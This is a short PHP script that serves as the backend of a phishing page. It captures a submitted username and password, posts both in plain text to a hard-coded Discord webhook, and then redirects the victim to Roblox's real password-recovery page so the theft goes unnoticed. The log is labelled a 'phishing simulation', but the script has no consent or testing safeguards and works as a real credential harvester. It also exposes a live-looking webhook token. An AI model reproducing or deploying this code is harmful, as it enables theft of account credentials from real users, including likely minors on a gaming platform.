<?php

$username = $_POST['username'];
$password = $_POST['password'];


$data = [
    "content" => "**Phishing Simulation Log**\nUsername: `$username`\nPassword: `$password`"
];


$webhook_url = "https://discord.com/api/webhooks/1400737647974023198/YYWpqaYj5nEe6ECx5JK25O7Qcv_UpknGWUjMxqs7QQ0jTr5Rojmt0RjWp2DmjxdGjjbS";
$options = [
    "http" => [
        "header"  => "Content-Type: application/json",
        "method"  => "POST",
        "content" => json_encode($data),
    ]
];
$context  = stream_context_create($options);
file_get_contents($webhook_url, false, $context);

header('Location: https://www.roblox.com/login/forgot-password-or-username/');
exit();
?>
